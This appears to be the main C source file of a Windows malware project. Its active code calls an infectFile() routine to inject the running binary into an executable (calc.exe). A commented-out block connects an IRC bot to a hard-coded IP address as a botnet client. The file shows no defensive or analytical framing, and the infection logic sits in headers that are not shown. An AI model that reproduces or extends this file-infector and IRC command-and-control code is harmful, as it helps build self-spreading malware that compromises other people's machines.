#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "log.h"
#include "irc.h"
#include "infector.h"


int main(int argc, char * argv[])
{
    /*
      if (prepareBot("188.126.73.62", 6667) != 0) {
        getchar();
        exit(1);
      }

      printf("connected\n");
      botHello("w32smshr", "w32smshr", "w32smshr");
      botLoop();
    */

    if (infectFile(argv[0], strlen(argv[0]), "C:\\Users\\null\\Documents\\calc.exe") != ERR_OK) {
        D2("appendBuf2Bin() failed.\n");
    }

    D2("done");
    //getchar();
    return 0;
}
